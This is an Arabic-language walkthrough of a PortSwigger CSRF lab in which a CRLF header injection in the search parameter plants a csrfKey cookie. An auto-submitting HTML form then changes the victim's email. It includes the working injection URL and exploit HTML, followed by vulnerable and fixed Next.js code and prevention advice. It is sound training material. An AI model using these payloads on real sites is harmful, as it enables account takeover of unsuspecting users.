# Lab: CSRF where token is tied to non-session cookie

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يربط CSRF Token بـ **كوكي غير مربوط بالجلسة** (non-session cookie). يمكننا حقن هذه الكوكي في متصفح الضحية باستخدام ثغرة **CRLF Injection** في وظيفة البحث، ثم تنفيذ هجوم CSRF.

**الحسابات:** `wiener:peter` و `carlos:montoya`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم آلية التحقق

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account** → **Update email**
- اعترض الطلب في Burp:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_WIENER; csrfKey=KEY_WIENER

email=test@test.com&csrf=TOKEN_WIENER
```

**ملاحظة:** التوكن (`csrf`) مربوط بكوكي `csrfKey` وليس بالجلسة.

### الخطوة 2: اختبار أن التوكن يعمل عبر الحسابات

- أرسل الطلب إلى Repeater
- غير قيمة `session` إلى قيمة عشوائية → يرفض الطلب ✅
- غير قيمة `csrfKey` فقط إلى قيمة عشوائية → يرفض الطلب ✅
- غير `csrfKey` و `csrf` معاً بقيم صحيحة من حساب آخر → **الطلب ينجح** ✅

**الاستنتاج:** `csrfKey` غير مربوط بجلسة `session`، ويمكن استخدامه على أي حساب.

### الخطوة 3: استخراج csrfKey و csrf من حساب wiener

من طلب wiener، انسخ:
- `csrfKey=WIENER_CSRF_KEY`
- `csrf=WIENER_TOKEN`

### الخطوة 4: إثبات أن التوكن يعمل على حساب carlos

- افتح نافذة خاصة (Incognito)
- سجل الدخول بـ `carlos:montoya`
- في Repeater، استبدل `csrfKey` و `csrf` بقيم wiener
- الطلب ينجح ✅

### الخطوة 5: اكتشاف CRLF Injection في البحث

لاحظ أن وظيفة البحث تعكس المدخلات في `Set-Cookie`:

```http
GET /?search=test HTTP/1.1
```

الرد:
```
Set-Cookie: search=test; SameSite=None
```

**نستغل هذا لحقن كوكي:** `%0d%0a` = سطر جديد

### الخطوة 6: إنشاء رابط لحقن كوكي csrfKey

```
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None
```

**ماذا يحدث؟** الخادم يرد بـ:
```
Set-Cookie: search=test
Set-Cookie: csrfKey=WIENER_CSRF_KEY; SameSite=None
```

### الخطوة 7: بناء HTML للهجوم

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
    <input type="hidden" name="csrf" value="WIENER_TOKEN">
</form>
```

**لماذا `onerror`؟** الصورة تحاول التحميل، تفشل (لأنها ليست صورة) ثم يتم إرسال الفورم.

### الخطوة 8: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- استبدل `YOUR-LAB-ID` و `WIENER_CSRF_KEY` و `WIENER_TOKEN`
- اضغط **Store**

### الخطوة 9: تجربة الهجوم على نفسك

- اضغط **View exploit**
- انتظر ثانية
- ارجع إلى حسابك → لاحظ أن بريدك تغير ✅

### الخطوة 10: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 11: حل المختبر

بعد بضع ثوانٍ، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي non-session cookie؟** | كوكي غير مربوط بجلسة المستخدم (مثل `csrfKey`) |
| **كيف حقنّا الكوكي؟** | باستخدام CRLF Injection في وظيفة البحث |
| **ماذا يفعل `%0d%0a`؟** | سطر جديد (CRLF) يسمح بحقن هيدرات جديدة |
| **لماذا `SameSite=None`؟** | ليسمح بإرسال الكوكي في الطلبات عبر المواقع |
| **لماذا `onerror`؟** | الصورة تفشل في التحميل فتنفذ الفورم |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. CSRF Token مربوط بكوكي غير مربوط بالجلسة (`csrfKey` قابل للمشاركة بين الحسابات)
2. وجود ثغرة **CRLF Injection** في وظيفة البحث تسمح بحقن كوكي جديد

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// وظيفة البحث - فيها CRLF Injection
res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);

// وظيفة تغيير البريد - التوكن مربوط بـ csrfKey
if (getCsrfToken(csrfKey) !== csrf) {
  return res.status(403).send('Invalid CSRF token');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// وظيفة البحث - إزالة CRLF
search = search.replace(/[\r\n]/g, '');

// وظيفة تغيير البريد - التوكن مربوط بالجلسة
const expectedToken = sessionTokens.get(sessionId);
if (!expectedToken || expectedToken !== csrf) {
  return res.status(403).send('Invalid CSRF token');
}
```

**الخلاصة:** 
1. التوكن يجب أن يكون مربوطاً بالجلسة، وليس بكوكي منفصل
2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **ربط التوكن بالجلسة:** استخدم `sessionId` لتخزين التوكن.
2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n` في أي مدخل.
3. **استخدام SameSite=Lax أو Strict:** كطبقة دفاع إضافية.
4. **استخدام CSRF Tokens:** حتى مع SameSite.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [CRLF Injection](https://portswigger.net/web-security/crlf-injection)
